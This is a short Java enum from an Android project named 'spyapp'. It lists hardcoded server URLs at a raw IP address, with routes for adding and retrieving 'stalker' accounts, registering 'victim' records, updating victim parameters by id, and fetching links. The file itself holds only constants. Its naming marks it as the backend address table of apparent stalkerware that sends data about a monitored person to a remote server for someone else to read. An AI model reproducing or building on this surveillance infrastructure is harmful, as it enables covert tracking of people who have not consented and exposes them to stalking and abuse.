package com.example.albert.spyapp.utils;

public enum Urls {
    TEST("http://35.204.80.21:4567/test"),
    ADDSTALKER("http://35.204.80.21:4567/stalker/addStalker"),
    GETSTALKER("http://35.204.80.21:4567/stalker/getStalker/"),
    UPDATEVICTIMPARAMS("http://35.204.80.21:4567/victim/updatesParams/:id"),
    ADDVIVTIM("http://35.204.80.21:4567/victim/addVictim"),
    GETVICTIM("http://35.204.80.21:4567/victim/getVictim/:id/:name"),
    GETLINKS("http://35.204.80.21:4567/stalker/links/");

    public String url;
    Urls(String address) {
        url=address;
    }
}
